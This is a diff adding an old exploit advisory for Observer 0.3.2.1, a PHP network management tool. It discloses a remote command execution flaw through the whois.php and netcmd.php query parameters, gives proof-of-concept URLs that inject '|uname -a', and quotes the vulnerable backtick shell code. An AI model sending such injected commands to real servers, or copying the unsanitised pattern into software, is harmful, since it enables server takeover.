@@ -1,0 +1,64 @@
+
+  :::::::-.   ...    ::::::.    :::.
+   ;;,   `';, ;;     ;;;`;;;;,  `;;;
+   `[[     [[[['     [[[  [[[[[. '[[
+    $$,    $$$$      $$$  $$$ "Y$c$$
+    888_,o8P'88    .d888  888    Y88
+    MMMMP"`   "YmmMMMM""  MMM     YM
+
+   [ Discovered by dun \ dun[at]strcpy.pl ]
+
+ #########################################################
+ #  [ observer <= 0.3.2.1 ]   Remote Command Execution   #
+ #########################################################
+ #
+ # Script: "Observer is an autodiscovering PHP/MySQL/SNMP/CDP based network management system focused primarily on Cisco and Linux/BSD networks."
+ #
+ # Script site: http://www.project-observer.org/
+ # Download: http://freshmeat.net/projects/observer/
+ #
+ # Vuln: 
+ # (1) http://site.com/[observer-0.3.2.1]/whois.php?query=|uname -a
+ # (2) http://site.com/[observer-0.3.2.1]/netcmd.php?cmd=nmap&query=|uname -a    
+ #
+ #
+ # Bug(1): ./observer-0.3.2.1/html/whois.php
+ #
+ # ...
+ # 	$output = `/usr/bin/whois $_GET[query] | grep -v \%`;
+ #	$output = trim($output);
+ #	echo("<pre>$output</pre>");
+ # ... 	 
+ #
+ #
+ # Bug(2): ./observer-0.3.2.1/html/netcmd.php
+ #
+ # ...
+ #  switch ($_GET[cmd]) {
+ #   case 'whois':
+ #     $output = `/usr/bin/whois $_GET[query] | grep -v \%`;
+ #     break;
+ #   case 'ping':
+ #     $output = `/bin/ping $_GET[query]`;
+ #     break;
+ #   case 'tracert':
+ #     $output = `/usr/sbin/traceroute $_GET[query]`;
+ #     break;
+ #   case 'nmap':
+ #     $output = `/usr/bin/nmap $_GET[query]`;
+ #     break;
+ #  }
+ #  $output = trim($output);
+ #  echo("<pre>$output</pre>");
+ # ... 			    		    
+ #
+ #
+ ###############################################
+ # Greetz: D3m0n_DE * str0ke * and otherz..
+ ###############################################
+
+ [ dun / 2008 ] 
+
+*******************************************************************************************
+
+# milw0rm.com [2008-09-24]
